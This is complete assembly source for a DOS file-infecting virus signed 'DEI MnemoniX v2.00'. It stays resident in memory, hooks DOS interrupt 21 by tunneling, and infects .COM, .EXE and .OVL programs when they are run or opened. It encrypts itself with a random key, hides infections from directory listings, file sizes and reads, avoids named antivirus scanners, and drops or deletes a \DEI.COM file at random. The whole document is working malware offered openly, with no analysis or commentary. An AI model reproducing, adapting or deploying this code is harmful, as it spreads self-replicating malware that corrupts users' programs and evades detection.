; =======================================================================>

PING            equ     0BF1h                   ; a worthless DOS function
PONG            equ     0DEAFh                  ; response to residency test

code            segment
		org     100h
		assume  cs:code,ds:code

start:
		jmp     virus_begin             ; fake host program
		db      26 dup (0)

virus_begin:
		db      0BBh                    ; mov bx,
code_offset     dw      0
		db      0B0h                    ; mov al,
cipher          db      0
decrypt:
		db      02Eh                    ; cs:
decryptor_1:    xor     [bx],al
		inc     bx
shift_1:        neg     al
		db      81h,0FBh                ; cmp bx,
code_offset_2   dw      0
		jbe     decrypt
viral_code:
		call    $ + 3                   ; BP is instruction ptr.
		pop     bp
		sub     bp,offset $ - 1

		push    ds es                   ; save segregs
		
		jmp     kill_sourcer            ; mess with disassemblers
		db      0E9h
kill_sourcer:
		xor     ah,ah                   ; create or delete the
		int     1Ah                     ; \DEI.COM file at random
		cmp     dx,0FE00h               ; times ...
		jb      dont_drop
		call    drop_program
		jmp     dont_delete
dont_drop:
		cmp     dx,0800h
		ja      dont_delete
		call    delete_program
dont_delete:
		mov     ax,PING                 ; residency test
		int     21h
		cmp     bx,PONG                 ; if installed,
		jne     not_installed           ; don't install again
		jmp     installed
not_installed:
		mov     ax,es                   ; install ourselves
		dec     ax                      ; in memory
		mov     ds,ax

		sub     word ptr ds:[3],(MEM_SIZE + 15) / 16 + 1
		sub     word ptr ds:[12h],(MEM_SIZE + 15) / 16 + 1
		mov     ax,ds:[12h]             ; doing some calculations and
		mov     ds,ax                   ; a bit of manipulation to

		sub     ax,15                   ; memory
		mov     es,ax                   ; ES points to our destiny
		mov     byte ptr ds:[0],'Z'
		mov     word ptr ds:[1],8
		mov     word ptr ds:[3],(MEM_SIZE + 15) / 16 + 1

		push    cs                      ; zopy it
		pop     ds
		mov     di,100h
		mov     cx,virus_end - start
		lea     si,[bp + start]
		rep     movsb

		xor     ax,ax
		mov     ds,ax

		sub     word ptr ds:[413h],7    ; allocate memory from BIOS

		mov     si,21h * 4              ; saving old interrupt 21
		mov     di,offset old_int_21    ; first
		movsw
		movsw

		lea     dx,[bp + int_1]
		mov     ds:[4],dx               ; recursive tunneling - 
		mov     ds:[6],cs               ; trace through interrupt 21

		push    es
		mov     ah,52h                  ; get list of lists
		int     21h                     ; for segment of DOS's int 21
		mov     ax,es
		mov     cs:[bp + int_21_seg],ax
		pop     es
		mov     [bp + our_es],es

		mov     ax,100h                 ; set trap flag
		push    ax
		popf

		mov     ah,0Bh                  ; and send us down the tunnel
		pushf
		call    dword ptr ds:[21h * 4]

		xor     ax,ax                   ; turn off trap flag
		push    ax
		popf

		mov     word ptr ds:[si - 4],0  ; little anti-trace ...

		mov     ds:[si - 4],offset new_int_21
		mov     ds:[si - 2],es          ; and set new interrupt 21

installed:
		pop     es ds
		cmp     cs:[bp + exe_flag],1    ; is this an .EXE file? 
		je      exe_exit                ; if so, exit as such
com_exit:
		lea     si,[bp + offset host]   ; restore original header
		mov     di,100h
		push    di
		mov     cx,28
		rep     movsb

		call    reset_regs

		ret                             ; and leave

exe_exit:
		
		mov     ax,ds
		add     ax,cs:[bp + exe_cs]
		mov     word ptr cs:[bp + jump_to + 2],ax
		mov     ax,cs:[bp + exe_ip]
		mov     word ptr cs:[bp + jump_to],ax

		mov     ax,ds
		add     ax,cs:[bp + exe_ss]     ; restore original stack
		cli
		mov     ss,ax
		mov     sp,cs:[bp + exe_sp]

		call    reset_regs              ; reset registers

		db      0EAh
jump_to         dd      0

reset_regs:
		mov     si,100h
		xor     ax,ax
		xor     bx,bx
		xor     di,di
		xor     bp,bp
		ret

; int 1 handler for tunneling.

int_21_seg      dw      0                       ; original int 21 segment
our_es          dw      0                       ; our ES

int_1:
		push    bp                      ; save registers used
		mov     bp,sp

		push    ax
		mov     ax,[bp + 4]             ; SEGMENT of next instruction

		push    bp
		call    get_dest_seg            ; get location pointer
get_dest_seg:
		pop     bp

		cmp     ax,cs:[bp - (get_dest_seg - int_21_seg)]
		pop     bp                      ; restore BP
		jbe     tunneled                ; found, we're through

		push    ds si                   ; no, check next instruction

		mov     ds,ax
		mov     si,[bp + 2]             ; OFFSET of next instruction
		lodsb                           ; next instruction in AL

		cmp     al,0CFh                 ; IRET instruction?
		je      set_iret                ; adjust accordingly

		cmp     al,09Dh                 ; POPF instruction?
		je      set_popf                ; adjust

		jmp     flag_check_done         ; never mind ...

tunneled:                                       ; we're done ... save segment
		push    es si
		call    get_our_es
get_our_es:
		pop     si
		mov     si,cs:[si - (get_our_es - our_es)]
		mov     es,si
		mov     word ptr es:[old_int_21 + 2],ax
		mov     ax,[bp + 2]             ; and offset
		mov     word ptr es:[old_int_21],ax
		and     [bp + 6],0FEFFh         ; deinstall tunnel routine
		pop     si es
		jmp     exit

set_iret:
		or      [bp + 10],100h          ; OFFSET of second interrupt
		jmp     flag_check_done         ; call on stack (flags)

set_popf:
		or      [bp + 6],100h           ; OFFSET of word before
						; interrupt call on stack
flag_check_done:
		pop     si ds
exit:
		pop     ax bp
		iret

; int 24 handler.
; DOS changes it back automatically.

new_int_24:
		mov     al,3                    ; simple enough
		iret

; ================================================>
; int 21 handler.
; trap 11h,12h,3Dh,3Fh,4Bh,4Eh,4Fh,6Ch, and 5700h
; ================================================>

int_21:
		pushf
		call    dword ptr cs:[old_int_21]
		ret

new_int_21:
		cmp     ax,PING                 ; are we checking on ourself?
		je      pass_signal             ; yes, give the signal

		cmp     ax,4B00h                ; program execution?
		je      execute                 ; uh - huh

		cmp     ah,11h                  ; directory stealth method 1
		je      dir_stealth_1           ; (hide from DIR listing)
		cmp     ah,12h
		je      dir_stealth_1

		cmp     ah,4Eh                  ; directory stealth method 2
		je      dir_stealth_2           ; (hide from ASCIIZ search)
		cmp     ah,4Fh
		je      dir_stealth_2

		cmp     ah,3Dh                  ; file open method 1
		jne     go_on
		jmp     file_open
go_on:
		cmp     ah,6Ch                  ; file open method 2
		jne     go_on_2  
		jmp     file_open
go_on_2:
		cmp     ah,3Fh                  ; file read
		jne     go_on_3    
		jmp     file_read
go_on_3:
		cmp     ax,5700h                ; get date
		jne     int_21_exit
		jmp     fix_date

int_21_exit:
		db      0EAh                    ; never mind ...
old_int_21      dd      0

pass_signal:
		mov     bx,PONG                 ; pass signal
		jmp     int_21_exit

execute:
		call    check_name
		jc      skip_infect             ; don't infect if marked
		call    infect_ds_dx            ; simple enough ...
skip_infect:
		jmp     int_21_exit

dir_stealth_1:
		call    int_21                  ; do it
		test    al,al                   ; if al = -1
		js      cant_find               ; then don't bother

		push    ax bx es                ; check file for infection

		mov     ah,2Fh
		int     21h

		cmp     byte ptr es:[bx],-1     ; check for extended FCB
		jne     no_ext_FCB
		add     bx,7

no_ext_FCB:
		mov     ax,es:[bx + 19h]
		cmp     ah,100                  ; check years -  
		jb      fixed                   ; if 100+, infected

		ror     ah,1
		sub     ah,100
		rol     ah,1
		mov     es:[bx + 19h],ax

		sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + 28
		sbb     word ptr es:[bx + 1Fh],0
fixed:
		pop     es bx ax
cant_find:
		iret


dir_stealth_2:
		call    int_21                  ; perform file search
		jnc     check_file_2            ; if found, proceed
		retf    2                       ; nope, leave
check_file_2:
		push    ax bx si es

		mov     ah,2Fh                  ; find DTA
		int     21h

		mov     ax,es:[bx + 18h]
		cmp     ah,100                  ; check for infection marker
		jb      fixed_2

		ror     ah,1                    ; fix up date
		sub     ah,100
		rol     ah,1
		mov     es:[bx + 18h],ax

		sub     word ptr es:[bx + 1Ah],VIRUS_SIZE + 28
		sbb     word ptr es:[bx + 1Ch],0
fixed_2:
		pop     es si bx ax             ; done
		clc
		retf    2

file_open:
		call    try_infecting           ; try to infect file

		call    int_21                  ; open file
		jc      open_fail               ; carry set, open failed
			 
		cmp     ax,5                    ; if handle is a device,
		jb      dont_bother             ; don't bother with it

		push    ax bx di es

		xchg    ax,bx
		push    bx
		mov     ax,1220h                ; get system file table
		int     2Fh                     ; entry
		
		nop                             ; anti-SCAN

		mov     bl,es:[di]
		mov     ax,1216h
		int     2Fh
		pop     bx

		call    check_datestamp         ; check datestamp
		jb      dont_stealth
		
		cmp     word ptr es:[di],1      ; if file has already
		ja      dont_stealth            ; been opened, don't stealth

		sub     es:[di + 11h],VIRUS_SIZE + 28
		sbb     word ptr es:[di + 13h],0 ; stealth it ... change file
						; size

dont_stealth:
		pop     es di bx ax             ; restore everything
dont_bother:
		clc
open_fail:
		retf    2                       ; and return

file_read:
		cmp     bx,5                    ; if read from device,
		jae     check_it_out            ; don't bother
		jmp     forget_it

check_it_out:
		push    si di es ax bx cx
		
		push    bx
		mov     ax,1220h                ; get SFTs
		int     2Fh

		nop

		mov     bl,es:[di]
		mov     ax,1216h
		int     2Fh
		pop     bx

		call    check_datestamp         ; 100+ years
		jae     check_pointer           ; is the magic number
		jmp     no_read_stealth
check_pointer:
		cmp     word ptr es:[di + 17h],0 ; if file pointer above 64K,
		je      check_pointer_2         ; then skip it
		jmp     no_read_stealth

check_pointer_2:
		cmp     word ptr es:[di + 15h],28 ; if file pointer under 28,
		jae     no_read_stealth         ; then DON'T

		push    es:[di + 15h]           ; save it
		
		mov     ah,3Fh
		call    int_21                  ; do the read function
		
		pop     cx                      ; now find how many bytes
		push    ax                      ; (Save AX value)
		sub     cx,28                   ; we have to change ...
		neg     cx                      ; and where

		cmp     ax,cx                   ; if more than 28 were read,
		jae     ok                      ; ok

		xchg    ax,cx                   ; otherwise, switch around
ok:
		push    ds cx dx

		push    es:[di + 15h]           ; save current file pointer
		push    es:[di + 17h]

		add     es:[di + 11h],VIRUS_SIZE + 28
		adc     word ptr es:[di + 13h],0
		mov     ax,es:[di + 11h]        ; fix up file size to prevent
		sub     ax,28                   ; read past end of file

		mov     es:[di + 15h],ax
		mov     ax,es:[di + 13h]
		mov     es:[di + 17h],ax

		push    cs                      ; now read in real first 28
		pop     ds                      ; bytes
		mov     dx,offset read_buffer
		mov     cx,28
		mov     ah,3Fh
		call    int_21

		sub     es:[di + 11h],VIRUS_SIZE + 28
		sbb     word ptr es:[di + 13h],0

		pop     es:[di + 17h]           ; restore file pointer
		pop     es:[di + 15h]

		pop     dx cx ds                ; now we move our 28 bytes
		push    ds                      ; into theirs ...
		pop     es

		mov     di,dx
		mov     si,offset read_buffer
		push    cs
		pop     ds
		rep     movsb                   ; done

		push    es                      ; restore DS
		pop     ds

		pop     ax
		pop     cx bx es es di si
		clc
		retf    2

no_read_stealth:
		pop     cx bx ax es di si
forget_it:
		jmp     int_21_exit

fix_date:
		call    int_21                  ; get date
		jc      an_error
		cmp     dh,100                  ; if years > 100,
		jb      date_fixed              ; fix it up
		ror     dh,1
		sub     dh,100
		rol     dh,1
date_fixed:
		iret
an_error:
		retf    2
; Called routines

; this routine checks for a .COM or .EXE file
try_infecting:
		push    di es cx ax

		cmp     ax,6C00h                ; extended open fix
		jne     get_ext
		xchg    dx,si
get_ext:
		mov     di,dx                   ; find program extension
		push    ds
		pop     es
		mov     cx,64
		mov     al,'.'
		repnz   scasb
		pop     ax
		jcxz    let_it_be               ; ... "ecch" ...

		cmp     [di],'OC'               ; .COM file?
		jne     perhaps_exe             ; maybe .EXE, then
		cmp     byte ptr [di + 2],'M'
		jne     let_it_be               ; not program, don't infect
		jmp     yes_infect_it
perhaps_exe:
		cmp     [di],'XE'               ; .EXE file?
		jne     one_more_try            ; maybe ... .OVL?
		cmp     byte ptr [di + 2],'E'
		jne     let_it_be
		jmp     yes_infect_it
one_more_try:
		cmp     [di],'VO'               ; .OVL file?
		jne     let_it_be
		cmp     byte ptr [di + 2],'L'
		jne     let_it_be
yes_infect_it:
		call    check_name              ; don't infect forbidden
		jc      let_it_be               ; programs
		call    infect_ds_dx
let_it_be:
		cmp     ah,6Ch                  ; extended open fixup
		jne     get_out
		xchg    dx,si
get_out:
		pop     cx es di
		ret

; this routine checks the filename at DS:DX for certain 'bad' programs

check_name:
		push    ax cx es di

		push    ds                      ; find extension
		pop     es
		mov     di,dx
		mov     cx,64
		mov     al,'.'
		repnz   scasb

		cmp     word ptr [di - 3],'NA'  ; SCAN or TBSCAN
		jne     pass_1
		cmp     word ptr [di - 5],'CS'
		je      av_prog
pass_1:
		cmp     word ptr [di - 3],'TO'  ; Frisk's F-PRoT
		jne     pass_2
		cmp     word ptr [di - 5],'RP'
		je      av_prog
pass_2:
		cmp     word ptr [di - 3],'DN'  ; COMMAND.COM
		jne     pass_3                  ; ("Bad or Missing," etc.)
		cmp     word ptr [di - 5],'AM'
		je      av_prog
pass_3:
		cmp     word ptr [di - 5],'SA'  ; MS-DOS's QBASIC
		jne     pass_4                  ; ("Packed file is corrupt")
		cmp     word ptr [di - 7],'BQ'
		je      av_prog
pass_4:
		clc                             ; passed the test
		jmp     check_complete
av_prog:
		stc                             ; ack! *GAG* *boo* *hiss*
check_complete:
		pop     di es cx ax
		ret

; this routine infects the file at DS:DX

infect_ds_dx:
		push    ax bx cx dx si di ds es

		in      al,21h                  ; some anti-trace
		xor     al,2
		out     21h,al

		xor     al,2
		out     21h,al

		mov     ax,3D00h                ; read-only ... we'll change        
		call    int_21                  ; it later, but it won't trip
		jnc     hook_24                 ; some AV monitors
		jmp     cant_open

hook_24:
		xor     bx,bx                   ; hook int 24h
		mov     ds,bx                   ; prevent write protect errors
		mov     ds:[24h * 4],offset new_int_24
		mov     ds:[24h * 4 + 2],cs

		xchg    bx,ax                   ; get system file tables
		push    bx
		mov     ax,1220h
		int     2Fh
		nop                             ; anti-SCAN

		mov     bl,es:[di]
		mov     ax,1216h
		int     2Fh
		pop     bx

		call    check_datestamp         ; if already infected,
		jae     dont_infect             ; don't do it again

		mov     word ptr es:[di + 2],2  ; change mode to R/W

		push    cs                      ; read in 28 bytes of
		pop     ds                      ; our potential host ...

		mov     dx,offset read_buffer
		mov     cx,28
		mov     ah,3Fh                  ; (carefully avoiding
		call    int_21                  ;  our stealth routine)

		cmp     word ptr read_buffer,'ZM'
		je      infect_exe              ; if .EXE, infect as one

		mov     exe_flag,0              ; infect as .COM

		mov     ax,es:[di + 11h]        ; get file size

		cmp     ax,65279 - VIRUS_SIZE + 28
		ja      dont_infect             ; don't infect; too big

		cmp     ax,28
		jb      dont_infect             ; don't infect; too small

		mov     es:[di + 15h],ax        ; move to end of file
						; (I just love the SFTs ...)
		call    encrypt_and_write_virus ; encrypt the virus code
						; then write it to the file

		mov     dx,offset read_buffer   ; store original
		mov     cx,28                   ; header
		mov     ah,40h
		call    int_21

		mov     word ptr es:[di + 15h],0 ; and lastly, back to
						; the beginning of the file
		mov     dx,offset new_header    ; to add the new header
		mov     ah,40h
		mov     cx,22                   ; our header's only 22 bytesx
		call    int_21

		mov     cx,es:[di + 0Dh]        ; fix date/time
		mov     dx,es:[di + 0Fh]
		ror     dh,1
		add     dh,100
		rol     dh,1
		mov     ax,5701h
		call    int_21
dont_infect:
		mov     ah,3Eh                  ; and close the file
		call    int_21
cant_open:
		jmp     infect_exit             ; infection done; exit

infect_exe:
		cmp     word ptr read_buffer[24],'@'
		jne     not_windows
		jmp     infect_exit             ; Windows .EXE, don't infect
not_windows:
		cmp     word ptr read_buffer[26],0
		je      not_overlay
		jmp     infect_exit             ; overlay .EXE, don't infect
not_overlay:
		mov     exe_flag,1              ; infect as .EXE

		push    es di                   ; move original header
		push    cs                      ; into new header area
		pop     es

		mov     si,offset read_buffer
		mov     di,offset header_buffer
		mov     cx,28
		rep     movsb

		pop     di es

		push    es:[di + 11h]           ; save file size on stack
		push    es:[di + 13h]

		push    word ptr read_buffer[22]         ; CS ...
		pop     exe_cs
		add     exe_cs,10h              ; (adjust)
		push    word ptr read_buffer[20]         ; IP ...
		pop     exe_ip

		push    word ptr read_buffer[14]         ; SS ...
		pop     exe_ss
		add     exe_ss,10h              ; (adjust)
		push    word ptr read_buffer[16]         ; and SP
		pop     exe_sp                 

		pop     dx ax                   ; now we calculate new CS:IP
		push    ax dx                   ; (save these for later)

		push    bx
		mov     cl,12                   ; calculate offsets for CS
		shl     dx,cl                   ; and IP
		mov     bx,ax
		mov     cl,4
		shr     bx,cl
		add     dx,bx
		and     ax,15
		pop     bx

		sub     dx,word ptr read_buffer[8]
		mov     word ptr read_buffer[22],dx
		mov     word ptr read_buffer[20],ax
		
		pop     dx ax
		add     ax,VIRUS_SIZE + 28
		adc     dx,0
		push    ax dx

		mov     cl,4                    ; create a stack segment
		shr     ax,cl
		add     ax,200

		cmp     ax,word ptr read_buffer[14]
		jb      no_new_stack            ; if theirs is better, skip it
		
		mov     dx,-2                   ; set SP to FFFE always
		mov     word ptr read_buffer[14],ax
		mov     word ptr read_buffer[16],dx
no_new_stack:
		pop     dx ax                   ; now calculate program size

		mov     cx,512                  ; in pages
		div     cx                      ; then save results
		inc     ax
		mov     word ptr read_buffer[2],dx
		mov     word ptr read_buffer[4],ax
		
		mov     ax,4202h                ; this is just easier
		cwd                             ; than using the SFTs
		xor     cx,cx
		call    int_21

		mov     ax,word ptr read_buffer[20] ; get code offset
		call    encrypt_and_write_virus ; encrypt virus code
						; and write it to the file
		mov     dx,offset header_buffer ; write original header
		mov     cx,28                   ; to file
		mov     ah,40h
		call    int_21

		mov     word ptr es:[di + 15h],0
		mov     word ptr es:[di + 17h],0 ; back to beginning of file

		mov     dx,offset read_buffer   ; and write new header to file
		mov     ah,40h
		call    int_21
		
		mov     cx,es:[di + 0Dh]        ; fix date/time
		mov     dx,es:[di + 0Fh]
		ror     dh,1
		add     dh,100
		rol     dh,1
		mov     ax,5701h
		call    int_21

		mov     ah,3Eh                  ; close file
		call    int_21

infect_exit:
		pop     es ds di si dx cx bx ax ; done ... leave
		ret

encrypt_and_write_virus:
		push    es di bx ax             ; save code offset and SFT
		mov     bx,ax

		xor     ah,ah                   ; get random number from
		int     1Ah                     ; system clock
		mov     cipher,dl               ; and use it for encryption

		pop     ax                      ; fix up offset

		cmp     exe_flag,0
		jne     not_org_100h
		add     ax,100h
not_org_100h:
		add     ax,(viral_code - virus_begin)
		mov     ds:code_offset,ax

		add     ax,(virus_end - viral_code) - 1 ; second offset
		mov     ds:code_offset_2,ax

		mov     si,offset virus_begin
		mov     di,offset encrypt_buffer

		push    cs                      ; move decryption module
		pop     es

		mov     cx,viral_code - virus_begin
		rep     movsb

		mov     si,offset viral_code
		mov     cx,virus_end - viral_code
encrypt:                                        ; now encrypt virus code
		lodsb                           ; with a simple encryption
decryptor_2:
		xor     al,dl                   ; key ...
shift_2:
		neg     dl
		stosb
		loop    encrypt

		cmp     exe_flag,0              ; if .COM file,
		jne     exe_infection
		mov     ax,bx
		call    create_header           ; create unique header

exe_infection:
		pop     bx di es                ; restore SFT

		mov     ah,40h                  ; wrte virus code to file
		mov     cx,VIRUS_SIZE
		mov     dx,offset encrypt_buffer
		call    int_21

		ret

check_datestamp:
		mov     ax,es:[di + 0Fh]        ; a little routine to
		cmp     ah,100                  ; check timestamps
		ret

drop_program:
		lea     dx,[bp + offset weirdo] ; this creates our
		push    ds                      ; little signature
		push    cs
		pop     ds
		mov     ah,3Ch
		mov     cx,3
		int     21h
		jc      no_drop

		xchg    ax,bx
		mov     ah,40h
		mov     cx,(drop_me_end - drop_me)
		lea     dx,[bp + offset drop_me]
		int     21h

		mov     ah,3Eh
		int     21h

no_drop:
		pop     ds
		ret

delete_program:
		mov     ah,41h
		lea     dx,[bp + offset weirdo]
		push    ds
		push    cs
		pop     ds
		int     21h
		pop     ds
		ret

create_header:
		push    ax
		add     ax,100h + (offset decrypt - offset virus_begin)
		mov     ds:mov_1,ax             ; header
		inc     ax
		inc     ax
		mov     ds:mov_2,ax

		xor     ah,ah                   ; fill in useless MOVs
		int     1Ah                     ; with random bytes
		mov     ds:mov_al,cl
		mov     ds:mov_ax,dx

		push    dx                      ; modify header a little ...
		and     cl,7                    ; make things weirder ...
		add     cl,0B0h
		mov     ds:mov_reg,cl
		and     dl,3
		add     dl,0B8h
		mov     ds:mov_regx,dl
		pop     dx

		push    cs
		pop     es
		mov     di,offset encrypt_buffer
		add     di,offset decrypt - offset virus_begin
		mov     ax,dx                   ; now fill decryption module
		neg     ax                      ; with some garbage
		stosw
		rol     ax,1
		stosw

		pop     ax
		sub     ax,20                   ; fix up JMP instruction
		mov     ds:new_jump,ax

		ret                             ; done

new_header      db      0C7h,06
mov_1           dw      00
		db      2Eh
decryptor_3     db      30h                 ; first MOV
mov_reg         db      0B0h
mov_al          db      00                      ; a nothing MOV bytereg,
		db      0C7h,06
mov_2           dw      00
		db      07,043h                 ; second MOV
mov_regx        db      0B8h
mov_ax          dw      00                      ; a nothing MOV wordreg,
		db      0E9h                    ; jump instruction
new_jump        dw      0                       ; virus offset

exe_flag        db      0

exe_cs          dw      0                       ; EXE code/stack settings
exe_ip          dw      0
exe_ss          dw      0
exe_sp          dw      0

drop_me:
		mov     ah,9                    ; this program is dropped
		mov     dx,109h                 ; at random times within
		int     21h                     ; the root directory as
		int     20h                     ; \DEI.COM

sig             db      'Devils & Evangels, Inc. '
		db      '[DEI] MnemoniX $',0
drop_me_end:
		db      'v2.00'

weirdo          db      '\DEI.COM',0

virus_end:
host:
		mov     ah,4Ch                  ; fake host program
		int     21h

VIRUS_SIZE      equ     virus_end - virus_begin

read_buffer     db      28 dup (?)
header_buffer   db      28 dup (?)
encrypt_buffer  db      VIRUS_SIZE dup (?)
end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
		end     start
